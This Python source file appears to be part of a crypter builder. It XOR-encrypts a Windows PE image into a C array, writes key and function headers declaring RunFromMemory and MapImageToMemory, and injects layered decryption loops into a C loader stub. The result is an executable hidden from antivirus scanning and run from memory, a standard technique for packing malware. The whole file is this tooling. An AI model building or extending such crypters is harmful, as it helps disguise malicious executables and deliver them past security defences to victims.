import string
import random


def gen_rand_filename():
    name = ""
    for i in range(1, 10):
        name += random.choice(list(string.ascii_uppercase + string.ascii_lowercase))
    return name


def get_size(filename):
    with open(filename, "rb") as file:
        length = len(file.read())
        return length


def clean_hex_output(hex_bytes):
    raw_crypt_bytes = b""
    for byte in hex_bytes.split():
        byte = byte.replace("0x", '')
        byte = byte.replace(",", '')
        if len(byte) == 1:
            byte = f"0{byte}"
        try:
            raw_crypt_bytes += bytes.fromhex(byte).encode('utf-8')
        except AttributeError:
            raw_crypt_bytes += bytes.fromhex(byte)
    return raw_crypt_bytes


def prepare_pe_image(bytes_len, data):
    pe_image = f"#define array_len {bytes_len}\n\n"
    pe_image += "unsigned long long image_crypt[] = {\n"
    pe_image += data
    pe_image += "\n};"
    return pe_image


def write_pe_image(path, pe_image):
    with open(path, "w") as file:
        file.write(pe_image)


def write_header_file(path, keys_used, jmp=False, runpe=False):
    headerfile = ""
    with open(path, "w") as file:
        for key in keys_used:
            headerfile += f"#define key{key} {hex(keys_used[key])}\n"
        if jmp is True:
            headerfile += "\nVOID FixImageIAT(PIMAGE_DOS_HEADER dos_header, PIMAGE_NT_HEADERS nt_header);\n"
            headerfile += "LPVOID MapImageToMemory(LPVOID base_addr);\n"
        if runpe is True:
            headerfile += "void RunFromMemory(char* pImage, char* pPath);\n"
        file.write(headerfile)


def write_decrypt(path, loops, enc_type="xor"):
    first_run = False
    to_write = ""
    if enc_type == "xor":
        while loops != 0:
            loops -= 1
            if first_run is False:
                first_run = True
                first_decrypt = """
  for (i = 0; i < array_len; i++) {
      decrypted_bytes[i] = key%s ^ image_crypt[i];
      image_crypt[i] = '\\0';
  }
""" % loops
                to_write += first_decrypt

            else:
                decrypt = """
  for (i = 0; i < array_len; i++) {
      decrypted_bytes[i] = key%s ^ decrypted_bytes[i];
  }\n
""" % loops
                to_write += decrypt

    with open(path, "r") as file:
        data = file.readlines()
        file.close()

    data_backup = data
    safe = ''.join(data_backup)
    data.insert(120, to_write)

    outdata = ''.join(data)

    with open(path, "w") as file:
        file.write(outdata)
        file.close()

    return safe


def clean_up(path, clean):
    with open(path, "w") as file:
        file.write(clean)
        file.close()
    return
